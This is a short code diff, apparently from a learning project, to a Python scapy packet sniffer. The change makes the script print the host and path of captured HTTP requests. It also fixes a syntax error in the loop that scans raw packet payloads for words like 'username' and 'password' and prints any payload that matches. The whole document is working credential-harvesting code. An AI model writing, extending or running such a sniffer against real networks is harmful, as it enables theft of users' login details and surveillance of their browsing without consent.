@@ -9,11 +9,14 @@ def sniff(interface):
 def process_sniffed_packet(packet):
 
     if packet.haslayer(http.HTTPRequest):
-       if packet.haslayer(scapy.Raw):  #Raw is the layer that contains username and password
+       url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path   #extracting urls, urls present in http layer>>hostfield>>pathfield
+       print(url)
+
+       if packet.haslayer(scapy.Raw):       #Raw is the layer that contains username and password
           load = packet[scapy.Raw].load     #load is the field that contains username and password
           keywords = ["username","user","login","password","pass"]
           for keyword in keywords:
-              if keyword in load"
+              if keyword in load:	
                  print(load)
                  break
        
